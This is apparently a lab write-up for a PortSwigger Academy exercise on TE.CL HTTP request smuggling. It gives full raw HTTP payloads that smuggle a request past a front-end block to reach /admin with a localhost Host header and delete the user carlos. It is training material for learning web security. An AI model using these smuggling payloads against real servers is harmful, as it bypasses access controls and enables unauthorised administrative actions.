#  Exploiting HTTP - request smuggling to bypass front-end security controls, TE.CL vulnerability

## 📌 Lab Details
- **Title**: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/c91df7d449cc4882b6bc0e5d19694f659acdcfba2c19706c49c67f947891d53c?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-bypass-front-end-controls-te-cl

## 🔍 Summary
This lab had a **front-end** that blocked `/admin` and a **back-end** that did not support chunked encoding. By sending a **TE.CL request smuggling attack**, we tricked the front-end into treating extra data as part of the current request, while the back-end interpreted it as a **new request**. 

## 🛠 Steps to Solve
1. Try to visit `/admin` and observe that the request is blocked.
2. Uncheck the "Update Content-Length" option in **Burp Repeater**.
3. Using Burp Repeater, issue the following request twice:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-length: 4
   Transfer-Encoding: chunked

   60
   POST /admin HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0
   ```
4. Observe that the merged request to `/admin` was rejected due to not using the header `Host: localhost`.
5. Issue the following request twice:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-length: 4
   Transfer-Encoding: chunked

   71
   POST /admin HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0
   ```
6. Observe that you can now access the admin panel.
7. Using the previous response as a reference, change the smuggled request URL to delete `carlos`:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-length: 4
   Transfer-Encoding: chunked

   87
   GET /admin/delete?username=carlos HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0
   ```

## 📖 Key Takeaways
- **Vulnerability type**: HTTP Request Smuggling (**TE.CL** – Transfer-Encoding: chunked, then Content-Length for the smuggled request).
- Back-end didn’t support chunked encoding, so the smuggled request had to use **Content-Length**.
- Include `Host: localhost` so the back-end accepts the request.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7d460bba-d556-4404-97cb-1995d19fce91" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/704b2314-5205-4990-b34d-8f17b2792f8d" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/018e43ad-12a2-4f4f-8d69-250146269812" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/16140fc9-163d-4001-a5c7-41b6b5ce092e" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bae07b90-ed72-4621-8376-77aeb3a64e13" />
